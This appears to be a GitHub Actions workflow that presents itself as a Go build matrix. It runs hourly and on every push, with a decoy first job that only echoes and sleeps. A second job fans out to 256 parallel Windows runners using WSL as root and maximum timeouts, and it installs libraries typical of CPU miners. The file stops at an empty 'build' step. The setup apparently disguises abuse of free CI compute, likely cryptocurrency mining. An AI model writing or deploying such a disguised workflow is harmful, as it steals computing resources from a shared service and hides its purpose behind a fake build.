name: Rp_go
on:
  push:
  schedule:
    - cron: '0 * * * *'


jobs:
  pen:
    container:
      image: ubuntu:bionic
    runs-on: ubuntu-latest
    continue-on-error: true
    strategy:
      max-parallel: 20
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4, 1.5]
        flag: [1A]
    timeout-minutes: 360
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
    - name: mugg_go
      run: |
        set -e
        echo Done
        sleep 10
  Rp-1:
    needs: pen
    runs-on: windows-latest
    continue-on-error: true
    strategy:
      max-parallel: 256
      fail-fast: false
      matrix:
         compiler: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
         flag: [1a, 1b, 1c, 1d, 1e, 1f, 1g, 1h, 1j, 1k, 1l, 1m, 1n, 1o, 1p, 1q]  
    timeout-minutes: 350
    env:
        NUM_JOBS: 256
        JOB: ${{ matrix.go }}
    defaults:
     run:
       shell: wsl-bash -u root {0}
    steps: 
    - name: set up Go ${{ matrix.go }} 
      uses: actions/setup-go@v1 
      with: 
        go-version: ${{ matrix.go }} 
      id: go 
    - name: setup 
      uses: Vampire/setup-wsl@v1 
    - name : install dependencies 
      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1  
    - name: build  
